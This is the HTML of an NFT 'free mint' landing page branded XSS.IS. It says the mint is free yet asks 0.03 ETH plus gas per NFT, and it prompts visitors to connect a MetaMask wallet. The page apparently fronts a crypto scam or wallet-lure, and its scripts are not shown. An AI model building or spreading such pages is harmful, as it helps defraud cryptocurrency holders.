<!DOCTYPE html><html style="--vh:8.81px;" >
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>XSS.IS LIVE MINT</title>


    <link rel="stylesheet" type="text/css" href="normalize.css">
    <link rel="stylesheet" type="text/css" href="main.css">
<style> .body { background-image: url("background.jpg"); background-repeat: no-repeat; background-size: cover; background-attachment: fixed; background-position: center } </style></head>

<body class="body">

    <div class="content">
        

        <div class="sub-head" id="claim-text-wrapper">
           
            <div id="payment-modal">
                <div id="payment-header">
                    <div id="payment-header-text">
                        <h3 style="text-align:center" id="titleH4"> XSS.IS</h3> <!-- Auto edit (config in index.js) -->
                        <h3 style="text-align:center">FREE Mint LIVE!</h3>
                        <p style="text-align:center" id="totalSupply" class="pt-1.5 italic-grey">Total supply: 100 NFTs</p>
                        <!-- Auto edit (config in index.js) -->
                    </div>
                </div>
                <div id="payment-info">
                    <img src="xss.PNG" class="image" height="100px" id="price-img">
                    <div id="payment-info-text">
                        <p>Price Per NFT</p>
                        <p class="title"><a id="nftPrice">0.03</a> ETH + gas</p>
                        
                    </div>
                </div>
               
          
 
                <div class="flex items-center justify-center space-x-4 mt-5">
                    <div class="w-100 h-12 flex flex-col items-center justify-center border border-brand rounded">
                        <div id="ape-number" >
                            <div class="calcs" >
                                
                                     <form class="div"  oninput="result.value=(a.value * price).toFixed(2)" style="display: flex;">
                                        <div class="down_arrow" id="addCount" style="font-size: 30px;" > - </div>
                            <input id="inputor" name="a" class="nftsNumber eth_input text-white text-center leading-3 -mt-1 placeholder-white text-lg md:text-xl lg:text-3xl font-semibold w-12 h-12 bg-transparent focus-within:outline-none" type="number" min="1" pattern="[A-z0-9]{2,50}" max="5"
                                placeholder="1" value="1" style="background-color: #00000000;;text-align:center;width:30px;border-color: #00000000;margin-left:15px;"><div class="up_arrow" id="remCount" style="font-size: 30px;font-weight: 400;"> + </div></div><h5 id="maxNumber" style="text-align: right;margin-bottom:5px ;">5 Max</h5>
                    </div></div>
                </div>
                <p class="text-alert text-sm font-semibold pt-3 leading-4 pb-4"></p>
                <div id="ape-total">
                <p class="mt-3"><span class="total text-white  text-base md:text-lg lg:text-xl">Total:</span>




                    <output id="price"  name="price"  class="actual_price ml-1 text-lg md:text-xl lg:text-3xl text-brand font-semibold">0.03</output>
                    </form>


                    <span class="actual_price ml-1 text-lg md:text-xl lg:text-3xl text-brand font-semibold" id="">ETH</span> &nbsp;<span class="actual_price text-white text-base md:text-lg lg:text-xl font-semibold">+ gas fee</span></p></div>
                <div class="flex flex-col justify-center lg:flex-row items-center lg:space-x-4 mt-6">
                    <div class="metamask" id="button">
                        <div class="metamask_content">
                            <div class="container_metamask_content-btn">
                                <button id="connectbtn" disabled class="purchase-button hidden metamask_content-btn bg-brand   md:text-base text-xs py-2.5 md:py-4 px-6 lg:px-0 lg:w-183 rounded-8 leading-4 font-black hover:scale-110 md:hover:scale-110 transform transition-all duration-500 ease-in-out  flex items-center justify-center   text-darker disabled"> Connect Wallet </button>
                            </div>

                            <div class="container_link_metamask_install-btn">
                                <a class="link_metamask_install-btn" href ="https://metamask.io/download/">
                                    <button class="purchase-button metamask_install-btn bg-brand   md:text-base text-xs py-2.5 md:py-4 px-6 lg:px-0 lg:w-183 rounded-8 leading-4 font-black hover:scale-110 md:hover:scale-110 transform transition-all duration-500 ease-in-out  flex items-center justify-center    text-darker"
                                        style=> Install Metamask </button>
                                </a>
                            </div>

                        </div>

                    </div>
                </div>
            </div>

            

            
            

            

        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
    <script src="js/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer" type="6c3aa3c1166d73f9cffacc90-text/javascript"></script>
    <script src="js/script.js" type="6c3aa3c1166d73f9cffacc90-text/javascript"></script>
    <script src="cdn.jsdelivr.net/npm/web3%40latest/dist/web3.min.html" type="6c3aa3c1166d73f9cffacc90-text/javascript"></script>
  
    <script src="cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="6c3aa3c1166d73f9cffacc90-|49" defer=""></script>
</body></html>
